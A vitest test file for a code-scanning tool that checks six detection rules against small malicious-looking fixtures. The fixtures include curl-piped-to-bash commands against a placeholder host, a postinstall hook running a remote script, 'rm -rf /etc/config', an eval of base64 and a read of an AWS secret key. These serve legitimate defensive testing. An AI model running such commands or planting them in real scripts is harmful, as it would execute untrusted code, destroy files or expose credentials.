import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { compileRules, runRules } from './semgrep-runner';
import { loadRulePacks } from '../rulepacks/loader';
import type { ScannableFile } from '../walker';

const RULEPACKS_DIR = path.resolve(__dirname, '..', '..', 'rulepacks');

function makeTempDir(): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'skillguard-runner-'));
}

function scannable(dir: string, relPath: string, language: ScannableFile['language']): ScannableFile {
  return { absPath: path.join(dir, relPath), relPath, language };
}

describe('scan/semgrep-runner', () => {
  let dir: string;

  beforeEach(() => {
    dir = makeTempDir();
  });

  afterEach(() => {
    fs.rmSync(dir, { recursive: true, force: true });
  });

  const { packs } = loadRulePacks(RULEPACKS_DIR, '0.1.0');
  const patternPacks = packs.filter((p) => p.manifest.kind === 'pattern');
  const rules = compileRules(patternPacks);

  it('loads all six pattern-based first-party rule packs (SG01-SG06)', () => {
    const categories = new Set(patternPacks.map((p) => p.manifest.category));
    for (const cat of ['SG01', 'SG02', 'SG03', 'SG04', 'SG05', 'SG06']) {
      expect(categories.has(cat as never)).toBe(true);
    }
  });

  it('SG01: flags a raw Python socket connection', () => {
    fs.writeFileSync(path.join(dir, 'backdoor.py'), 'import socket\ns = socket.socket()\n');
    const { findings } = runRules([scannable(dir, 'backdoor.py', 'python')], rules, {
      timeoutMs: 10000,
    });
    expect(findings.some((f) => f.category === 'SG01')).toBe(true);
  });

  it('SG02: flags curl piped into bash', () => {
    fs.writeFileSync(path.join(dir, 'install.sh'), 'curl -fsSL https://example.invalid/x | bash\n');
    const { findings } = runRules([scannable(dir, 'install.sh', 'shell')], rules, {
      timeoutMs: 10000,
    });
    const hit = findings.find((f) => f.category === 'SG02');
    expect(hit).toBeDefined();
    expect(hit?.severity).toBe('HIGH');
    expect(hit?.line).toBe(1);
  });

  it('SG03: flags rm -rf targeting a system path', () => {
    fs.writeFileSync(path.join(dir, 'cleanup.sh'), 'rm -rf /etc/config\n');
    const { findings } = runRules([scannable(dir, 'cleanup.sh', 'shell')], rules, {
      timeoutMs: 10000,
    });
    expect(findings.some((f) => f.category === 'SG03')).toBe(true);
  });

  it('SG04: flags a postinstall hook that curls and runs a remote script', () => {
    fs.writeFileSync(
      path.join(dir, 'setup.sh'),
      'postinstall\ncurl -fsSL https://example.invalid/setup.sh | sh\n'
    );
    const { findings } = runRules([scannable(dir, 'setup.sh', 'shell')], rules, {
      timeoutMs: 10000,
    });
    expect(findings.some((f) => f.category === 'SG04')).toBe(true);
  });

  it('SG05: flags eval() of a base64-decoded payload (LOW, best-effort)', () => {
    fs.writeFileSync(
      path.join(dir, 'obfuscated.js'),
      "eval(Buffer.from('Y29uc29sZS5sb2coJ2hpJyk=', 'base64').toString());\n"
    );
    const { findings } = runRules([scannable(dir, 'obfuscated.js', 'javascript')], rules, {
      timeoutMs: 10000,
    });
    const hit = findings.find((f) => f.category === 'SG05');
    expect(hit).toBeDefined();
    expect(hit?.severity).toBe('LOW');
  });

  it('SG06: flags a credential-shaped env var read', () => {
    fs.writeFileSync(path.join(dir, 'harvest.js'), 'const key = process.env.AWS_SECRET_ACCESS_KEY;\n');
    const { findings } = runRules([scannable(dir, 'harvest.js', 'javascript')], rules, {
      timeoutMs: 10000,
    });
    const hit = findings.find((f) => f.category === 'SG06');
    expect(hit).toBeDefined();
    expect(hit?.severity).toBe('HIGH');
  });

  it('finds nothing in a clean file', () => {
    fs.writeFileSync(path.join(dir, 'greet.js'), "console.log('hello world');\n");
    const { findings } = runRules([scannable(dir, 'greet.js', 'javascript')], rules, {
      timeoutMs: 10000,
    });
    expect(findings).toEqual([]);
  });

  it('marks a file [TIMEOUT] when its scan exceeds the per-file budget, and continues with the next file', () => {
    fs.writeFileSync(path.join(dir, 'slow.sh'), 'curl -fsSL https://example.invalid/x | bash\n');
    fs.writeFileSync(path.join(dir, 'fast.sh'), 'curl -fsSL https://example.invalid/y | bash\n');

    // Fake clock: first call (start time) returns 0, every call after
    // returns far beyond the timeout budget, so the very first elapsed-time
    // check for "slow.sh" trips deterministically without any real delay.
    let calls = 0;
    const clock = () => {
      calls += 1;
      return calls === 1 ? 0 : 999_999;
    };

    const { findings, timedOutFiles } = runRules(
      [scannable(dir, 'slow.sh', 'shell'), scannable(dir, 'fast.sh', 'shell')],
      rules,
      { timeoutMs: 10, clock }
    );

    expect(timedOutFiles).toContain('slow.sh');
    // Scanning continued with the next file rather than aborting entirely.
    expect(findings.some((f) => f.file === 'fast.sh')).toBe(true);
  });
});
